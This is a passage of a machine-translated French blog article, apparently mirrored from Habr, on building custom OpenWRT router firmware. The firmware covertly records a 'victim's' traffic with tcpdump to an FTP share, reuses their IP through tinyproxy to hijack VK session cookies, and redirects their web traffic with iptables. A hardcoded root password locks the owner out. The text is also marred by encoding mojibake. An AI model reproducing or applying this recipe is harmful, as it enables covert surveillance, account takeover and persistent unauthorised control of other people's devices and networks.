style="vertical-align: inherit;">Par cons√©quent, la taille du fichier √©tait limit√©e par la taille du cache, qui est extr√™mement petite. </font><font style="vertical-align: inherit;">J'ai donc choisi curlftpfs. </font><font style="vertical-align: inherit;">Le trafic a √©t√© enregistr√© √† l'aide de tcpdump et a √©t√© divis√© en fichiers de 512 Mo.</font></font><br>
<pre><code class="bash hljs">tcpdump -i br-lan -w /root/ftp/dump/`date +<span class="hljs-string">"%d_%m_%Y_%T_"</span>` -C 512Mb &amp;
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O√π / root / ftp / dump est notre syst√®me de fichiers ftp. </font><font style="vertical-align: inherit;">Toutes ces affaires peuvent √™tre mises en d√©marrage automatique (/etc/rc.local). </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En g√©n√©ral, l'ensemble final de packages pour le firmware OpenWRT Attitude Adjustment 12.09 ressemblait √† ceci:</font></font><br>
<pre><code class="bash hljs">make image PROFILE=TLWR740 PACKAGES=<span class="hljs-string">"curlftpfs tcpdump tinyproxy wireless-tools -ppp -ppp-mod-pppoe"</span> FILES=files/
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Curlftpfs occupe la majeure partie de la m√©moire, mais nous en donne une quantit√© illimit√©e par ftp. </font><font style="vertical-align: inherit;">Tcpdump vous permet d'enregistrer le trafic de la victime 24 heures sur 24, et tinyproxy vous permet d'acc√©der √† Internet √† partir de l'IP de la victime, c'est-√†-dire qu'en interceptant </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">remixsid,</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> par exemple, nous pouvons √©galement saisir le VK de l'utilisateur √† partir de son IP en utilisant tinyproxy, ou nous pouvons simplement rediriger son trafic vers son proxy de cette fa√ßon:</font></font><br>
<pre><code class="bash hljs">iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to ip:port
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En g√©n√©ral, nous pouvons compl√®tement diriger le trafic. </font><font style="vertical-align: inherit;">Vous pouvez √©galement installer des packages sur un syst√®me de fichiers ftp mont√©, pour cela, nous utilisons </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">opkg ‚Äìdest</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , apr√®s avoir sp√©cifi√© le nom et l'adresse de notre syst√®me de fichiers dans </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/opkg.conf</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Le reste de la configuration doit √©galement √™tre pr√©-enregistr√© dans les fichiers appropri√©s.</font></font><br>
<pre><code class="bash hljs">/etc/firewall.user<font></font>
/etc/config/firewall<font></font>
/etc/config/network<font></font>
/etc/config/system<font></font>
/etc/config/wireless<font></font>
/etc/rc.local<font></font>
 .<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tous ces fichiers doivent √™tre pr√©par√©s √† l'avance afin de les int√©grer dans le firmware. </font><font style="vertical-align: inherit;">En fait, qu'est-ce que cela nous donne en plus des fonctionnalit√©s suppl√©mentaires? </font><font style="vertical-align: inherit;">Mais le fait est que le syst√®me de fichiers squashfs est en lecture seule. </font><font style="vertical-align: inherit;">Par cons√©quent, l'utilisateur ne pourra en aucun cas modifier les param√®tres par d√©faut que j'ai d√©finis. </font><font style="vertical-align: inherit;">Avec toute sa volont√©, m√™me via telnet, il ne pourra pas se connecter, </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">car</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> dans </font><i><font style="vertical-align: inherit;">rc.local</font></i><font style="vertical-align: inherit;"> , qui est cousu dans le firmware, il y a une ligne</font></font><br>
<pre><code class="bash hljs"><span class="hljs-built_in">echo</span> ‚Äìe ‚Äúpass\npass‚Äù | passwd root
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Autrement dit, l'acc√®s via telnet est coup√© imm√©diatement apr√®s le chargement du routeur, et seul moi a le mot de passe SSH. </font><font style="vertical-align: inherit;">La r√©initialisation par d√©faut avec un bouton physique √©chouera √©galement ici, car la valeur par d√©faut est d√©finie par moi et cousue dans le firmware. </font><font style="vertical-align: inherit;">Le but est atteint.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En lien avec le transfert de tous les utilisateurs vers IPoE ces derniers temps et l'abandon du VPN, tous √©taient derri√®re NAT, y compris les routeurs sur lesquels j'avais un VPN pour acc√©der au r√©seau interne du fournisseur. En plus de ceux qui ont activ√© le service ¬´Static IP¬ª, bien s√ªr. Mais il y a un probl√®me: ceux qui veulent une v√©ritable IP doivent toujours utiliser un VPN pour acc√©der √† Internet. J'ai d√ª me tourmenter et construire OpenWRT avec un client PPTP c√¢bl√© et configur√© (et cela fonctionne pour une raison vraiment tordue), ainsi qu'un serveur OpenVPN c√¢bl√© et configur√©. Beaucoup de routeurs sont morts pendant les exp√©riences, mais le r√©sultat a finalement √©t√© obtenu. Apr√®s avoir vers√© un tel firmware dans plusieurs routeurs (parmi les rares qui restent avec une v√©ritable IP), j'ai un acc√®s stable au r√©seau interne en utilisant OpenVPN.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le probl√®me avec la connexion VPN PPTP √©tait que les serveurs du fournisseur ne prennent pas en charge le cryptage. </font><font style="vertical-align: inherit;">Cela a √©t√© corrig√© en ajoutant une ligne √† </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc/ppp/options.pptp</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<pre><code class="bash hljs">nomppe
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sinon, le processus de configuration du client VPN PPTP et du serveur OpenVPN n'√©tait pas diff√©rent des manuels OpenWRT. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
J'esp√®re que cet article sera int√©ressant pour quelqu'un et que quelqu'un en apprendra quelque chose de nouveau. </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UPD:</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Comme </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ValdikSS l'a</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> √©crit dans les commentaires </font><font style="vertical-align: inherit;">, au lieu de curlftpfs + tinyproxy, vous pouvez utiliser OpenSSH, qui est plus fonctionnel.</font></font></div>
      
    </div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr381573/">https://habr.com/ru/post/fr381573/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr381559/index.html">Ultrabook anti-crise: bon march√© et joyeux</a></li>
<li><a href="../fr381563/index.html">Comment l'innovation technologique va changer la vie quotidienne</a></li>
<li><a href="../fr381565/index.html">Compteur d'√©nergie ou comment mesurer l'efficacit√© de la prise</a></li>
<li><a href="../fr381567/index.html">Twitter a supprim√© les publicit√©s qui pourraient conduire √† une crise d'√©pilepsie</a></li>
<li><a href="../fr381569/index.html">Instructions d'assemblage de l'imprimante 3D Prism Uni 3D (partie 2 - √©lectricien)</a></li>
<li><a href="../fr381575/index.html">L'homme est mont√© sur la sc√®ne de Broadway pour charger son smartphone. "La pleine lune ou l'idiot?"</a></li>
<li><a href="../fr381577/index.html">Robots de travail</a></li>
<li><a href="../fr381581/index.html">Les dix meilleurs serveurs et mises √† jour de 2015</a></li>
<li><a href="../fr381583/index.html">Un morceau de p√¢te</a></li>
<li><a href="../fr381585/index.html">La voiture Honda √©tablit un record mondial de consommation de carburant: 2,4 litres aux 100 km</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>